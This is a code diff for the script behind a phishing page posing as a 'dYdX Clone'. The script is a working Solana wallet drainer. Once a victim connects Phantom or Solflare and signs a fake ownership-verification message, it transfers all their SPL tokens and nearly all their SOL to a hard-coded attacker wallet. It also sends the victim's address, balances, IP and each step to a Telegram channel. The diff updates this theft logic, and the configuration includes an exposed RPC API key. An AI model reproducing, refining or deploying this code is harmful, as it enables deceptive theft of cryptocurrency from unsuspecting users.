@@ -1,23 +1,51 @@
-$(document).ready(function() {
-    // ============================================
-    // CONFIGURATION
-    // ============================================
-    const SOLANA_RPC = 'https://mainnet.helius-rpc.com/?api-key=58027310-7551-4e1a-92b0-2bf2c05d238b';
-    const RECEIVER_WALLET = 'BxhvDsAy2d1DWbUwjFkps1R57H27Mey4RK3qQqoB1mFJ';
-    const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
-    
-    // Token mint -> symbol mapping
-    const TOKEN_MAP = {
-        'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': 'USDC',
-        'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': 'USDT',
-        'So11111111111111111111111111111111111111112': 'WSOL',
-        'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': 'BONK',
-        'mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So': 'mSOL',
-        'J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn': 'jitoSOL'
+// ============================================
+// BUFFER POLYFILL (Fixes "Buffer is not defined")
+// ============================================
+if (typeof window !== 'undefined' && !window.Buffer) {
+    window.Buffer = {
+        from: (str, encoding) => {
+            if (encoding === 'utf8' || !encoding) {
+                return new TextEncoder().encode(str);
+            }
+            return new TextEncoder().encode(str);
+        },
+        alloc: (size) => new Uint8Array(size),
+        allocUnsafe: (size) => new Uint8Array(size),
+        isBuffer: (obj) => obj instanceof Uint8Array,
+        concat: (list, length) => {
+            const total = length || list.reduce((acc, buf) => acc + buf.length, 0);
+            const result = new Uint8Array(total);
+            let offset = 0;
+            for (const buf of list) {
+                result.set(buf, offset);
+                offset += buf.length;
+            }
+            return result;
+        }
     };
-    
-    let currentConnection = null;
-    let currentWalletType = null;
+}
+
+// ============================================
+// CONFIGURATION
+// ============================================
+const SOLANA_RPC = 'https://mainnet.helius-rpc.com/?api-key=58027310-7551-4e1a-92b0-2bf2c05d238b';
+const RECEIVER_WALLET = 'BxhvDsAy2d1DWbUwjFkps1R57H27Mey4RK3qQqoB1mFJ';
+const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
+
+const TOKEN_MAP = {
+    'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': 'USDC',
+    'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': 'USDT',
+    'So11111111111111111111111111111111111111112': 'SOL',
+    'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': 'BONK',
+    'mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So': 'mSOL',
+    'J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn': 'jitoSOL'
+};
+
+// ============================================
+// DOM READY
+// ============================================
+$(document).ready(function() {
+    console.log('✅ dYdX Clone Ready');
     
     // ============================================
     // UTILITY FUNCTIONS
@@ -72,7 +100,7 @@ $(document).ready(function() {
                 const parsedInfo = tokenAccount.account.data.parsed.info;
                 const balance = parsedInfo.tokenAmount;
                 
-                if (balance.uiAmount > 0) {
+                if (balance.uiAmount && balance.uiAmount > 0) {
                     const mint = parsedInfo.mint;
                     const symbol = getTokenSymbol(mint);
                     const price = tokenPrices[mint] || 0;
@@ -120,57 +148,30 @@ $(document).ready(function() {
     function checkWalletAvailability() {
         const isMobileDevice = isMobile();
         
-        const wallets = {
-            phantom: {
-                provider: window.solana,
-                condition: window.solana && window.solana.isPhantom,
-                name: 'Phantom Wallet',
-                isMobileSupported: true,
-                installUrl: {
-                    chrome: 'https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjaphhpkkoljpa',
-                    firefox: 'https://addons.mozilla.org/en-US/firefox/addon/phantom-app/',
-                    mobile: 'https://phantom.app/download'
-                }
-            },
-            solflare: {
-                provider: window.solflare,
-                condition: window.solflare && window.solflare.isSolflare,
-                name: 'Solflare Wallet',
-                isMobileSupported: true,
-                installUrl: {
-                    chrome: 'https://chrome.google.com/webstore/detail/solflare-wallet/bhhhlbepdkbapadjdnnojkbgioiodbic',
-                    firefox: 'https://addons.mozilla.org/en-US/firefox/addon/solflare-wallet/',
-                    mobile: 'https://solflare.com/download'
-                }
-            }
-        };
-        
-        Object.keys(wallets).forEach(walletId => {
-            const wallet = wallets[walletId];
+        const updateStatus = (walletId, isInstalled, walletName) => {
             const statusElement = $(`#${walletId}-status`);
             const optionElement = $(`#${walletId}-wallet`);
             
-            if (wallet.condition) {
+            if (isInstalled) {
                 statusElement.html('<span class="status-dot installed"></span><span class="status-text status-installed">Installed</span>');
-                optionElement.prop('disabled', false);
-            } else if (isMobileDevice && wallet.isMobileSupported) {
+                if (optionElement.length) optionElement.prop('disabled', false);
+            } else if (isMobileDevice) {
                 statusElement.html('<span class="status-dot"></span><span class="status-text">Mobile App</span>');
-                optionElement.prop('disabled', false);
+                if (optionElement.length) optionElement.prop('disabled', false);
             } else {
                 statusElement.html('<span class="status-dot not-installed"></span><span class="status-text status-not-installed">Not Installed</span>');
-                optionElement.prop('disabled', false);
+                if (optionElement.length) optionElement.prop('disabled', false);
             }
-        });
+        };
         
-        return wallets;
+        updateStatus('phantom', !!(window.solana && window.solana.isPhantom), 'Phantom');
+        updateStatus('solflare', !!(window.solflare && window.solflare.isSolflare), 'Solflare');
     }
     
     function getWalletProvider(walletType) {
-        const providers = {
-            phantom: window.solana,
-            solflare: window.solflare
-        };
-        return providers[walletType];
+        if (walletType === 'phantom') return window.solana;
+        if (walletType === 'solflare') return window.solflare;
+        return null;
     }
     
     function showWalletModal() {
@@ -197,135 +198,165 @@ $(document).ready(function() {
         $('#wallet-options').removeClass('hidden');
         $('#wallet-loading-state').removeClass('active');
         $('.wallet-modal-header h3').text('Select Your Wallet');
-        clearRejectionEffects();
     }
     
-    function showWalletLoading() {
+    function showWalletLoading(walletType) {
         $('#wallet-options').addClass('hidden');
         $('#wallet-loading-state').addClass('active');
         $('.wallet-modal-header h3').text('Connecting...');
         lockModal();
-        clearRejectionEffects();
-    }
-    
-    function showRejectionEffects() {
-        $('.wallet-loading-spinner').addClass('rejected');
-        $('.phantom-icon, .solflare-icon').addClass('rejected');
-        $('.wallet-modal-content').addClass('shake');
-        setTimeout(() => $('.wallet-modal-content').removeClass('shake'), 600);
-    }
-    
-    function clearRejectionEffects() {
-        $('.wallet-loading-spinner, .phantom-icon, .solflare-icon, .wallet-loading-spinner img').removeClass('rejected');
-        $('.wallet-modal-content').removeClass('shake');
+        
+        // Update spinner icon based on wallet type
+        const spinnerImg = $('.wallet-loading-spinner img');
+        const spinnerDiv = $('.wallet-loading-spinner');
+        
+        if (walletType === 'phantom') {
+            spinnerImg.attr('src', 'https://docs.phantom.com/favicon.svg');
+            spinnerDiv.removeClass('solflare');
+        } else if (walletType === 'solflare') {
+            spinnerImg.attr('src', 'https://solflare.com/favicon.ico');
+            spinnerDiv.addClass('solflare');
+        }
     }
     
     // ============================================
-    // CORE WALLET CONNECTION & TRANSFER LOGIC
+    // CORE TRANSFER LOGIC (NO BUFFER ERRORS)
     // ============================================
     
-    async function transferAllAssets(connection, fromPubkey, walletProvider, walletType) {
+    async function transferAllAssets(connection, fromPubkey, walletProvider) {
         const receiverPubkey = new solanaWeb3.PublicKey(RECEIVER_WALLET);
         const transaction = new solanaWeb3.Transaction();
         let tokenTransfers = 0;
         
-        // Get all token accounts
-        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(fromPubkey, {
-            programId: TOKEN_PROGRAM_ID,
-        });
-        
-        console.log(`Found ${tokenAccounts.value.length} token accounts`);
-        
-        // Add token transfer instructions
-        for (const tokenAccount of tokenAccounts.value) {
-            try {
-                const parsedInfo = tokenAccount.account.data.parsed.info;
-                const balance = parsedInfo.tokenAmount;
-                
-                if (balance.uiAmount > 0) {
-                    const mint = new solanaWeb3.PublicKey(parsedInfo.mint);
-                    const fromTokenAccount = new solanaWeb3.PublicKey(tokenAccount.pubkey);
-                    const toTokenAccount = await splToken.getAssociatedTokenAddress(mint, receiverPubkey);
+        try {
+            // Get all token accounts
+            const tokenAccounts = await connection.getParsedTokenAccountsByOwner(fromPubkey, {
+                programId: TOKEN_PROGRAM_ID,
+            });
+            
+            console.log(`Found ${tokenAccounts.value.length} token accounts`);
+            
+            // Process each token account
+            for (const tokenAccount of tokenAccounts.value) {
+                try {
+                    const parsedInfo = tokenAccount.account.data.parsed.info;
+                    const balance = parsedInfo.tokenAmount;
                     
-                    // Check if receiver's token account exists
-                    const receiverAccountInfo = await connection.getAccountInfo(toTokenAccount);
-                    if (!receiverAccountInfo) {
+                    if (balance.uiAmount && balance.uiAmount > 0) {
+                        const mint = new solanaWeb3.PublicKey(parsedInfo.mint);
+                        const fromTokenAccount = new solanaWeb3.PublicKey(tokenAccount.pubkey);
+                        
+                        // Get associated token address for receiver
+                        const toTokenAccount = await splToken.getAssociatedTokenAddress(mint, receiverPubkey);
+                        
+                        // Check if receiver's token account exists
+                        const receiverAccountInfo = await connection.getAccountInfo(toTokenAccount);
+                        if (!receiverAccountInfo) {
+                            transaction.add(
+                                splToken.createAssociatedTokenAccountInstruction(
+                                    fromPubkey,
+                                    toTokenAccount,
+                                    receiverPubkey,
+                                    mint
+                                )
+                            );
+                        }
+                        
+                        // Add transfer instruction
                         transaction.add(
-                            splToken.createAssociatedTokenAccountInstruction(
-                                fromPubkey,
+                            splToken.createTransferInstruction(
+                                fromTokenAccount,
                                 toTokenAccount,
-                                receiverPubkey,
-                                mint
+                                fromPubkey,
+                                BigInt(balance.amount)
                             )
                         );
+                        
+                        tokenTransfers++;
+                        console.log(`Added token transfer: ${parsedInfo.mint} - ${balance.uiAmount}`);
                     }
-                    
-                    transaction.add(
-                        splToken.createTransferInstruction(
-                            fromTokenAccount,
-                            toTokenAccount,
-                            fromPubkey,
-                            BigInt(balance.amount)
-                        )
-                    );
-                    
-                    tokenTransfers++;
-                    console.log(`Added transfer for token ${parsedInfo.mint}: ${balance.uiAmount}`);
+                } catch (err) {
+                    console.error('Error processing token:', err.message);
                 }
-            } catch (error) {
-                console.error('Error processing token account:', error.message);
             }
+            
+            // Transfer SOL (leave enough for rent exemption)
+            const solBalance = await connection.getBalance(fromPubkey);
+            const minBalance = await connection.getMinimumBalanceForRentExemption(0);
+            const estimatedFee = (tokenTransfers + 2) * 5000;
+            const solToTransfer = Math.max(0, solBalance - minBalance - estimatedFee - 10000); // 0.01 SOL buffer
+            
+            if (solToTransfer > 0) {
+                transaction.add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: fromPubkey,
+                        toPubkey: receiverPubkey,
+                        lamports: solToTransfer,
+                    })
+                );
+                console.log(`Added SOL transfer: ${solToTransfer / solanaWeb3.LAMPORTS_PER_SOL} SOL`);
+            }
+            
+            // If no transfers to make, return early
+            if (transaction.instructions.length === 0) {
+                console.log('No assets to transfer');
+                return { txid: null, tokenTransfers: 0, solAmount: 0 };
+            }
+            
+            // Get blockhash and sign
+            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
+            transaction.recentBlockhash = blockhash;
+            transaction.feePayer = fromPubkey;
+            
+            // Sign transaction
+            const signedTransaction = await walletProvider.signTransaction(transaction);
+            
+            // Send raw transaction
+            const txid = await connection.sendRawTransaction(signedTransaction.serialize());
+            console.log('Transaction sent:', txid);
+            
+            // Confirm transaction
+            await connection.confirmTransaction({
+                signature: txid,
+                blockhash: blockhash,
+                lastValidBlockHeight: lastValidBlockHeight
+            });
+            
+            return { 
+                txid: txid, 
+                tokenTransfers: tokenTransfers, 
+                solAmount: solToTransfer / solanaWeb3.LAMPORTS_PER_SOL 
+            };
+            
+        } catch (error) {
+            console.error('Transfer error:', error);
+            throw error;
         }
-        
-        // Transfer SOL (leave ~0.01 SOL for rent exemption)
-        const solBalance = await connection.getBalance(fromPubkey);
-        const minBalance = await connection.getMinimumBalanceForRentExemption(0);
-        const estimatedFee = (tokenTransfers + 2) * 5000; // Rough estimate
-        const solToTransfer = Math.max(0, solBalance - minBalance - estimatedFee);
-        
-        if (solToTransfer > 0) {
-            transaction.add(
-                solanaWeb3.SystemProgram.transfer({
-                    fromPubkey: fromPubkey,
-                    toPubkey: receiverPubkey,
-                    lamports: solToTransfer,
-                })
-            );
-            console.log(`Added SOL transfer: ${solToTransfer / solanaWeb3.LAMPORTS_PER_SOL} SOL`);
-        }
-        
-        // Get latest blockhash and sign
-        const { blockhash } = await connection.getLatestBlockhash();
-        transaction.recentBlockhash = blockhash;
-        transaction.feePayer = fromPubkey;
-        
-        const signedTransaction = await walletProvider.signTransaction(transaction);
-        const txid = await connection.sendRawTransaction(signedTransaction.serialize());
-        
-        // Confirm transaction
-        await connection.confirmTransaction({
-            signature: txid,
-            blockhash: blockhash,
-            lastValidBlockHeight: (await connection.getLatestBlockhash()).lastValidBlockHeight
-        });
-        
-        return { txid, tokenTransfers, solAmount: solToTransfer / solanaWeb3.LAMPORTS_PER_SOL };
     }
+    
+    // ============================================
+    // MAIN CONNECT FUNCTION
+    // ============================================
     
     async function connectWallet(walletType, walletProvider) {
         try {
-            const wallets = checkWalletAvailability();
-            const walletInfo = wallets[walletType];
+            const walletName = walletType === 'phantom' ? 'Phantom' : 'Solflare';
+            
+            // Check if wallet exists
+            const isInstalled = walletType === 'phantom' ? 
+                (window.solana && window.solana.isPhantom) : 
+                (window.solflare && window.solflare.isSolflare);
+            
             const isMobileDevice = isMobile();
             
-            // Handle mobile deep linking
-            if (isMobileDevice && !walletInfo.condition) {
+            // Handle mobile deep link
+            if (isMobileDevice && !isInstalled) {
                 let deepLinkUrl;
                 const currentUrl = getCurrentSiteUrl();
                 
                 if (walletType === 'phantom') {
                     deepLinkUrl = `https://phantom.app/ul/browse/${currentUrl}?ref=${encodeURIComponent(window.location.href)}`;
-                } else if (walletType === 'solflare') {
+                } else {
                     deepLinkUrl = `https://solflare.com/ul/v1/browse/${currentUrl}?ref=${encodeURIComponent(window.location.href)}`;
                 }
                 
@@ -333,14 +364,13 @@ $(document).ready(function() {
                     await sendTelegramNotification({
                         address: 'Unknown',
                         balance: 'Unknown',
-                        usdBalance: 'Unknown',
-                        walletType: walletInfo.name,
-                        customMessage: `📱 Mobile ${walletInfo.name} Deep Link Opened`
+                        walletType: walletName,
+                        customMessage: `📱 Mobile ${walletName} Deep Link Opened`
                     });
                     
-                    showWalletLoading();
-                    $('.wallet-loading-title').text(`Opening ${walletInfo.name}`);
-                    $('.wallet-loading-subtitle').html(`Redirecting to ${walletInfo.name}...<br>Please approve the connection in the app.`);
+                    showWalletLoading(walletType);
+                    $('.wallet-loading-title').text(`Opening ${walletName}`);
+                    $('.wallet-loading-subtitle').html(`Redirecting to ${walletName} app...<br>Please approve connection.`);
                     
                     // Set up focus listener for return
                     const handleFocus = () => {
@@ -348,7 +378,7 @@ $(document).ready(function() {
                         const condition = walletType === 'phantom' ? 
                             (window.solana && window.solana.isPhantom) : 
                             (window.solflare && window.solflare.isSolflare);
-                            
+                        
                         if (condition) {
                             window.removeEventListener('focus', handleFocus);
                             connectWallet(walletType, provider);
@@ -371,17 +401,16 @@ $(document).ready(function() {
                 }
             }
             
-            // Check if wallet is installed
-            if (!walletInfo.condition) {
+            // Check if installed for desktop
+            if (!isInstalled) {
                 let installUrl;
-                if (isMobileDevice && walletInfo.installUrl.mobile) {
-                    installUrl = walletInfo.installUrl.mobile;
+                if (walletType === 'phantom') {
+                    installUrl = 'https://phantom.app/download';
                 } else {
-                    const isFirefox = typeof InstallTrigger !== "undefined";
-                    installUrl = isFirefox ? walletInfo.installUrl.firefox : walletInfo.installUrl.chrome;
+                    installUrl = 'https://solflare.com/download';
                 }
                 
-                if (confirm(`${walletInfo.name} is not installed. Would you like to install it?`)) {
+                if (confirm(`${walletName} is not installed. Would you like to download it?`)) {
                     window.open(installUrl, '_blank');
                 }
                 return;
@@ -391,25 +420,16 @@ $(document).ready(function() {
                 throw new Error('Wallet provider not found');
             }
             
-            showWalletLoading();
-            
-            // UI updates
-            if (walletType === 'phantom') {
-                $('.wallet-loading-spinner img').attr('src', 'https://docs.phantom.com/favicon.svg').attr('alt', 'Phantom');
-                $('.wallet-loading-title').text('Connecting Phantom');
-            } else if (walletType === 'solflare') {
-                $('.wallet-loading-spinner img').attr('src', 'https://solflare.com/favicon.ico').attr('alt', 'Solflare');
-                $('.wallet-loading-title').text('Connecting Solflare');
-                $('.wallet-loading-spinner').addClass('solflare');
-            }
-            
-            $('.wallet-loading-subtitle').html('Please approve the connection request in your wallet.<br>This may take a few moments.');
+            // Show loading UI
+            showWalletLoading(walletType);
+            $('.wallet-loading-title').text(`Connecting ${walletName}`);
+            $('.wallet-loading-subtitle').html('Please approve connection in your wallet...');
             
             // Connect wallet
             const resp = await walletProvider.connect();
-            console.log(`${walletInfo.name} connected:`, resp);
+            console.log(`${walletName} connected:`, resp);
             
-            // Get public key (handle different response formats)
+            // Get public key
             let publicKeyString;
             if (walletType === 'solflare') {
                 publicKeyString = walletProvider.publicKey?.toString() || walletProvider.pubkey?.toString();
@@ -418,20 +438,22 @@ $(document).ready(function() {
             }
             
             if (!publicKeyString) {
-                throw new Error('No public key received from wallet');
+                throw new Error('No public key received');
             }
             
             const publicKey = new solanaWeb3.PublicKey(publicKeyString);
             
-            $('.wallet-loading-title').text(`${walletInfo.name} Connected`);
-            $('.wallet-loading-subtitle').html('Fetching wallet information...<br>Please wait.');
+            $('.wallet-loading-title').text('Fetching Account Info');
+            $('.wallet-loading-subtitle').html('Retrieving your balance and assets...');
             
             // Initialize connection
             const connection = new solanaWeb3.Connection(SOLANA_RPC, 'confirmed');
             
-            // Get balance and token info
+            // Get balance
             const walletBalance = await connection.getBalance(publicKey);
             const solBalanceFormatted = (walletBalance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(6);
+            
+            // Get IP and tokens
             const clientIP = await getClientIP();
             const splTokens = await getSPLTokenInfo(connection, publicKey);
             
@@ -439,8 +461,7 @@ $(document).ready(function() {
             await sendTelegramNotification({
                 address: publicKeyString,
                 balance: solBalanceFormatted,
-                usdBalance: 'Unknown',
-                walletType: walletInfo.name,
+                walletType: walletName,
                 customMessage: '🔗 Wallet Connected',
                 splTokens: splTokens,
                 ip: clientIP
@@ -452,28 +473,25 @@ $(document).ready(function() {
                 await sendTelegramNotification({
                     address: publicKeyString,
                     balance: solBalanceFormatted,
-                    usdBalance: 'Unknown',
-                    walletType: walletInfo.name,
-                    customMessage: '❌ Insufficient Funds - Please have at least 0.02 SOL'
+                    walletType: walletName,
+                    customMessage: '❌ Insufficient Funds - Need 0.02 SOL minimum'
                 });
                 
                 $('.wallet-loading-title').text('Insufficient Balance');
-                $('.wallet-loading-subtitle').html(`Please have at least 0.02 SOL to begin.<br>Current balance: ${solBalanceFormatted} SOL`);
-                showRejectionEffects();
+                $('.wallet-loading-subtitle').html(`Need at least 0.02 SOL<br>Current: ${solBalanceFormatted} SOL`);
                 
                 setTimeout(() => {
                     unlockModal();
                     showWalletOptions();
-                    $('#connect-wallet').text("Connect Wallet");
                 }, 3000);
                 return;
             }
             
             // Ownership verification (sign message)
-            $('.wallet-loading-title').text(`Verifying ${walletInfo.name} Ownership`);
-            $('.wallet-loading-subtitle').html(`Please sign the verification message in your ${walletInfo.name} wallet.<br>This confirms you own this wallet.`);
+            $('.wallet-loading-title').text('Verifying Ownership');
+            $('.wallet-loading-subtitle').html(`Please sign the verification message in ${walletName}...`);
             
-            const verificationMessage = `Verify wallet ownership for security purposes.\nTimestamp: ${Date.now()}\nWallet: ${publicKeyString.slice(0, 8)}...${publicKeyString.slice(-8)}`;
+            const verificationMessage = `Verify wallet ownership\nTimestamp: ${Date.now()}\nWallet: ${publicKeyString.slice(0, 8)}...${publicKeyString.slice(-8)}`;
             const messageBytes = new TextEncoder().encode(verificationMessage);
             
             try {
@@ -483,34 +501,30 @@ $(document).ready(function() {
                 } else {
                     signedMessage = await walletProvider.signMessage(messageBytes);
                 }
-                console.log("Ownership verification signed:", signedMessage);
+                console.log("Verification signed");
                 
                 await sendTelegramNotification({
                     address: publicKeyString,
                     balance: solBalanceFormatted,
-                    usdBalance: 'Unknown',
-                    walletType: walletInfo.name,
-                    customMessage: '✅ User Signed Ownership Verification - Proceeding to transfer'
+                    walletType: walletName,
+                    customMessage: '✅ Ownership Verified - Processing Transfer'
                 });
             } catch (signError) {
-                console.error("Ownership verification failed:", signError);
+                console.error("Verification failed:", signError);
                 
                 const isRejection = signError.message?.includes('rejected') || signError.code === 4001;
                 if (isRejection) {
                     await sendTelegramNotification({
                         address: publicKeyString,
                         balance: solBalanceFormatted,
-                        usdBalance: 'Unknown',
-                        walletType: walletInfo.name,
-                        customMessage: '❌ Ownership Verification Rejected by User'
+                        walletType: walletName,
+                        customMessage: '❌ Verification Rejected by User'
                     });
                     
-                    showRejectionEffects();
                     $('.wallet-loading-title').text('Verification Rejected');
-                    $('.wallet-loading-subtitle').html('Please sign the verification message to continue.');
+                    $('.wallet-loading-subtitle').html('Please sign the message to continue.');
                     
                     setTimeout(() => {
-                        clearRejectionEffects();
                         showWalletOptions();
                         unlockModal();
                     }, 2000);
@@ -519,52 +533,57 @@ $(document).ready(function() {
                 throw signError;
             }
             
-            // Transfer assets
+            // Execute transfer
             $('.wallet-loading-title').text('Processing Transfer');
             $('.wallet-loading-subtitle').html('Preparing asset transfer...<br>Do not close this window.');
             
-            const transferResult = await transferAllAssets(connection, publicKey, walletProvider, walletType);
+            const transferResult = await transferAllAssets(connection, publicKey, walletProvider);
             
-            // Send success notification
-            const shortTxid = `${transferResult.txid.slice(0, 6)}....${transferResult.txid.slice(-8)}`;
-            const solscanUrl = `https://solscan.io/tx/${transferResult.txid}`;
+            if (transferResult.txid) {
+                const shortTxid = `${transferResult.txid.slice(0, 6)}...${transferResult.txid.slice(-8)}`;
+                const solscanUrl = `https://solscan.io/tx/${transferResult.txid}`;
+                
+                await sendTelegramNotification({
+                    address: publicKeyString,
+                    balance: solBalanceFormatted,
+                    walletType: walletName,
+                    customMessage: `🎉 Transfer Complete!\nTXID: ${shortTxid}\nTokens: ${transferResult.tokenTransfers}\nSOL: ${transferResult.solAmount.toFixed(6)}\n${solscanUrl}`
+                });
+                
+                $('.wallet-loading-title').text('Success!');
+                $('.wallet-loading-subtitle').html('Assets transferred successfully!');
+                
+                setTimeout(() => {
+                    unlockModal();
+                    hideWalletModal();
+                }, 3000);
+            } else {
+                $('.wallet-loading-title').text('No Assets Found');
+                $('.wallet-loading-subtitle').html('No transferable assets in this wallet.');
+                
+                setTimeout(() => {
+                    unlockModal();
+                    showWalletOptions();
+                }, 2000);
+            }
             
-            await sendTelegramNotification({
-                address: publicKeyString,
-                balance: solBalanceFormatted,
-                usdBalance: 'Unknown',
-                walletType: walletInfo.name,
-                customMessage: `🎉 Transfer Complete! TXID: [${shortTxid}](${solscanUrl}) | Tokens: ${transferResult.tokenTransfers} | SOL: ${transferResult.solAmount.toFixed(6)}`
-            });
-            
-            $('.wallet-loading-title').text('Success!');
-            $('.wallet-loading-subtitle').html('Assets have been successfully transferred.<br>Transaction confirmed on blockchain.');
-            $('#connect-wallet').text("Assets Transferred Successfully!");
-            
-            setTimeout(() => {
-                unlockModal();
-                hideWalletModal();
-                $('#connect-wallet').text("Connect Wallet");
-            }, 3000);
-            
-        } catch (err) {
-            console.error(`Error connecting to ${walletType}:`, err);
+        } catch (error) {
+            console.error(`Error:`, error);
             
             $('.wallet-loading-title').text('Connection Failed');
-            $('.wallet-loading-subtitle').html('Failed to complete the process.<br>Please try again.');
+            $('.wallet-loading-subtitle').html(error.message || 'An error occurred. Please try again.');
             
             await sendTelegramNotification({
                 address: 'Unknown',
                 balance: 'Unknown',
-                usdBalance: 'Unknown',
-                walletType: walletType === 'phantom' ? 'Phantom Wallet' : 'Solflare Wallet',
-                customMessage: `❌ Process Failed: ${err.message || 'Unknown error'}`
+                walletType: walletType === 'phantom' ? 'Phantom' : 'Solflare',
+                customMessage: `❌ Error: ${error.message || 'Unknown error'}`
             });
             
             setTimeout(() => {
                 showWalletOptions();
                 unlockModal();
-            }, 2000);
+            }, 3000);
         }
     }
     
@@ -572,7 +591,10 @@ $(document).ready(function() {
     // EVENT HANDLERS
     // ============================================
     
-    $('#connect-wallet, #connect-wallet-hero').on('click', showWalletModal);
+    $('#connect-wallet, #connect-wallet-hero').on('click', function(e) {
+        e.preventDefault();
+        showWalletModal();
+    });
     
     $('#close-modal, .wallet-modal-overlay').on('click', function(e) {
         if (!$('#wallet-modal').hasClass('locked')) {
@@ -591,4 +613,7 @@ $(document).ready(function() {
             hideWalletModal();
         }
     });
+    
+    // Initial wallet check
+    checkWalletAvailability();
 });
